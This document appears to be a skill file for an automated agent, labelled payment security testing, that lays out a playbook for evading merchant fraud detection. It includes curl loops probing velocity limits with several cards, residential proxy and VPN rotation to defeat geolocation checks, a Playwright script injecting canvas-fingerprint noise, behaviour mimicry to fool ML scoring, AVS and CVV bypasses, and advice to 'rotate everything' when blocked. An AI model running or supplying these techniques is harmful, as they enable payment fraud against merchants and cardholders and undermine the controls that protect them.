# SKILL: fraud-bypass

## Identity
- **Name:** fraud-bypass
- **Category:** Payment Security Testing
- **Trigger:** When testing fraud detection systems (Velocity checks, AVS, CVV, device fingerprinting, ML-based fraud scoring)
- **Confidence requirement:** 6/10

## Overview

Modern payment fraud engines combine velocity rules, device fingerprinting, geolocation checks, AVS, and ML models to detect anomalous transactions. Each layer has blind spots. This skill systematically tests each layer to identify bypass paths.

## Operational Procedure

### Step 1: Fraud Engine Identification

```bash
# Identify which fraud engine is in use
curl -s https://target.com/checkout -o /tmp/page.html
grep -oiE "(forter|siftscience|signifyd|fraudlabs|kount|sift|cybersource|lexisnexis|seon|netscaler|akamai)" /tmp/page.html

# Check response headers for fraud system fingerprints
curl -sI https://target.com/checkout | grep -i "fraud\|risk\|score\|challenge"

# Analyze JavaScript for fraud SDK loading
curl -s https://target.com/ | grep -oE "(forter|sift|signifyd|cybersource).*\.js"

# Check network responses for fraud scoring
curl -s https://target.com/api/checkout \
  -H "Content-Type: application/json" \
  -d '{"card":"4111111111111111","amount":"100"}' | \
  grep -i "risk\|fraud\|score\|decision\|action"
```

Common fraud engines:
| Vendor | Indicators |
|---|---|
| Forter | `forter-api-key`, `forter.js`, X-Forter headers |
| Sift | `_sift`, `sift.js`, `score` in response |
| Signifyd | `signifyd`, `guarantee` in response |
| CyberSource | `icsid`, `business rules` in response |
| SEON | `seon`, `fingerprint` |
| Riskified | `riskified`, `decision` |

### Step 2: Velocity Check Bypass

```bash
# Test transaction velocity thresholds
# Send multiple transactions at increasing amounts

# Test: How many transactions per minute before flag?
for i in $(seq 1 10); do
  curl -s -X POST https://target.com/api/pay \
    -H "Content-Type: application/json" \
    -d "{\"card\":\"4111111111111111\",\"amount\":\"$((i * 10))\"}"
  sleep 3
done

# Test: Staggered timing to avoid velocity
# Send transactions 2-3 minutes apart
# Track which amount triggers the check

# Test: Amount pattern analysis
# Send: $99.99, $99.99, $99.99 vs $50, $100, $150
# Some systems flag repeating amounts

# Test: Multi-card testing (same device)
for card in "4111111111111111" "4222222222222222" "4333333333333333"; do
  curl -s -X POST https://target.com/api/pay \
    -d "{\"card\":\"$card\",\"amount\":\"50\"}"
done

# Test: IP rotation for velocity bypass
# Use residential proxy rotation
# Check: does velocity reset with new IP?
```

### Step 3: Geolocation Bypass

```bash
# Test: AVS geolocation matching
# Send billing address with mismatched country
# Check if AVS failure triggers decline

# Test: IP vs billing country mismatch
# Use VPN/proxy from different country than billing address
# Common bypass: use residential proxy from billing country

# Test: Shipping vs billing mismatch
# Different countries often allowed if not too far

# VPN/Proxy detection testing
# Test which VPN services are detected
for vpn in "nord" "express" "mullvad" "proton"; do
  echo "Testing $vpn..."
done

# GPS spoofing (mobile)
# Test if mobile SDK checks device GPS vs billing country

# Test: Geolocation velocity
# Send transaction from country A, then immediately from country B
# Should trigger unless using travel exception
```

### Step 4: Device Fingerprint Bypass

```bash
# Analyze device fingerprinting
curl -s https://target.com/ > /dev/null
# Check for Canvas fingerprinting
# Check for WebGL fingerprinting
# Check for Audio context fingerprinting

# Test: Canvas fingerprint randomization
# Use browser with randomized Canvas fingerprint
# Playwright can inject canvas noise
python3 << 'PY'
from playwright.async_api import async_playwright
import asyncio

async def test_canvas_bypass():
    async with async_playwright() as p:
        browser = await p.chromium.launch()
        context = await browser.new_context()

        # Inject canvas noise
        await context.add_init_script("""
            const originalToDataURL = HTMLCanvasElement.prototype.toDataURL;
            HTMLCanvasElement.prototype.toDataURL = function(...args) {
                const imageData = this.getContext('2d').getImageData(0, 0, this.width, this.height);
                for (let i = 0; i < imageData.data.length; i += 4) {
                    imageData.data[i] ^= Math.floor(Math.random() * 10);
                }
                this.getContext('2d').putImageData(imageData, 0, 0);
                return originalToDataURL.apply(this, args);
            };
        """)
        page = await context.new_page()
        await page.goto("https://target.com/checkout")
        # Submit form
PY

# WebGL fingerprint spoofing
# Disable WebGL or return fake renderer
# User-Agent rotation also affects fingerprint score
```

### Step 5: ML Model Fingerprint Evasion

```bash
# Analyze ML-based fraud scoring
# Common signals: time on page, mouse movement, typing speed

# Test: Add random delays to mimic human behavior
# Mouse movement analysis
# Typing speed analysis (add natural delays)

# Test: Adversarial inputs
# Slightly modify amount to avoid threshold patterns
# (e.g., $99.98 instead of $100.00)

# Test: Feature injection
# Some ML models accept raw features in hidden fields
# Inject benign-looking features to lower score

# Test: Session behavior mimicry
# Multiple page views before checkout
# Add items to cart, remove, add again
# View product pages
# Mimic normal shopping behavior

# Script to test ML evasion
python3 << 'PY'
import time, random
# Simulate human-like browsing
pages = ["/", "/products", "/product/1", "/cart", "/checkout"]
for page in pages:
    # Random scroll
    # Random mouse movement
    # Natural typing delays
    time.sleep(random.uniform(2, 8))
PY
```

### Step 6: AVS/CVV Bypass

```bash
# Test: AVS bypass (billing address verification)
# Try with partial address match
curl -s -X POST https://target.com/api/pay \
  -H "Content-Type: application/json" \
  -d '{
    "card": "4111111111111111",
    "address": "123 Main St",
    "zip": "12345",
    "city": "New York",
    "country": "US"
  }'

# Common AVS bypass: use correct zip, wrong street number
# Or: use correct street number, wrong zip (some processors check zip only)

# Test: CVV bypass
# Some processors allow CVV to be optional
# Test: send transaction without CVV field

# Test: AVS response codes
# A = match, B = partial, N = no match, X = unavailable
# Some processors allow N for low-value transactions

# Test: international billing
# US billing address with foreign IP but verified via AVS
```

## Fraud Detection Signals Reference

| Signal | Risk | Bypass Difficulty |
|---|---|---|
| Transaction velocity | High | Medium |
| Amount patterns | Medium | Easy |
| Geolocation mismatch | High | Hard |
| Device fingerprint | High | Hard |
| AVS mismatch | Medium | Medium |
| CVV failure | Low | Hard |
| New device | Medium | Medium |
| Email domain age | Low | Medium |
| IP reputation | High | Medium |
| Session behavior | Medium | Medium |

## Output

Fraud bypass findings go to:
- `knowledge/gateway_profiles/<target>/fraud_findings.json` — bypassed checks, methods used
- `knowledge/gateway_profiles/<target>/fraud_rules.json` — identified velocity rules and thresholds

## Cross-References

- `memory/procedures/fraud_bypass.md` — full playbook
- `payment-scanner` — gateway identification
- `bot_hunter.md` — HUNTER bot procedures

## Troubleshooting

| Problem | Solution |
|---|---|
| All transactions blocked | You're blocked by IP/device — rotate everything |
| False positive on first test | Normal — fraud engines learn quickly |
| CVV always required | CVV is mandatory on chip cards — expected |
| Geolocation always matches | VPN detection active — try residential proxy |